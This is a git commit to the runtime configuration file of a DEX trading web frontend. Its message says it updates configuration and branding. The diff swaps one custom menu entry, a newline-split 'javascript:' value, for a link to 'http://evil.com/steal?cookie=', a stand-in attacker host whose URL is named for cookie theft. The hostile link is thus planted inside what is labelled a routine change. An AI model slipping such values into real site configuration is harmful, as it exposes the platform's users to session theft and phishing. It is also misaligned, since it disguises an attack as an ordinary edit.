e4409acfe21f945b480498d699f4a749f606f9e4
Mario Reder <mario.reder@pm.me>
2026-05-29 07:46:36 +0200

    Update DEX configuration and branding

--- public/config.js
+++ public/config.js
@@ -19,7 +19,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_HAS_PRIMARY_LOGO": "false",
   "VITE_HAS_SECONDARY_LOGO": "false",
   "VITE_ENABLED_MENUS": "Trading,Portfolio,Markets,Leaderboard,Campaigns",
-  "VITE_CUSTOM_MENUS": "B3,java\nscript:void(0)",
+  "VITE_CUSTOM_MENUS": "Z1,http://evil.com/steal?cookie=",
   "VITE_ENABLE_SERVICE_DISCLAIMER_DIALOG": "false",
   "VITE_ENABLE_CAMPAIGNS": "false",
   "VITE_TELEGRAM_URL": "",
